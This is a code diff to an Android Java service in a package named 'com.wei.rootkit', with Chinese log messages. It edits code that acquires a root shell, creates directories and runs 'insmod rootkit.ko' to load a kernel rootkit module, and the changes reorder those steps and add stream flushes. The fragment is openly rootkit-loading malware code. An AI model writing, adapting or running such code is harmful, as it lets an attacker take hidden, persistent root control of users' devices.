@@ -41,7 +41,7 @@ public class InfoService {
 
         try {
             // 执行命令
-            Log.v("TAG","执行命令");
+            Log.d("TAG","执行命令");
 
             Runtime runtime=Runtime.getRuntime();
             //获得root权限
@@ -56,31 +56,26 @@ public class InfoService {
             */
 
             //String cmd="mkdir /data/data/com.wei.rootkit/files/test\n";
-            String cmd="cd /data/data/com.wei.rootkit/files\n";
+            String cmd="";
+
+            cmd="cd /data/data/com.wei.rootkit/files\n";
             localDataOutputStream.writeBytes(cmd);
-            localDataOutputStream.flush();
-
-            cmd="mkdir /data/local/testDir1\n";
-            localDataOutputStream.writeBytes(cmd);
-            localDataOutputStream.flush();
-
-            Log.v("TAG","执行命令testDir1");
-
-            cmd="insmod rootkit.ko\n";
-            localDataOutputStream.writeBytes(cmd);
-            //localDataOutputStream.flush();
-
-            Log.v("TAG","执行命令testDir2");
 
             cmd="mkdir testDir2\n";
             localDataOutputStream.writeBytes(cmd);
-            //localDataOutputStream.flush();
+            localDataOutputStream.flush();
+
+            Log.d("TAG","执行命令testDir2结束，开始执行insmod");
+
+            cmd="insmod rootkit.ko\n";
+            localDataOutputStream.writeBytes(cmd);
+            localDataOutputStream.flush();
 
             localDataOutputStream.writeBytes("exit\n");
             localDataOutputStream.flush();
 
-            Log.v("TAG","执行命令完毕");
             int v=process.waitFor();
+            Log.d("TAG","执行命令完毕");
 
             /*
             byte[] buffer = new byte[localInputStream.available()];
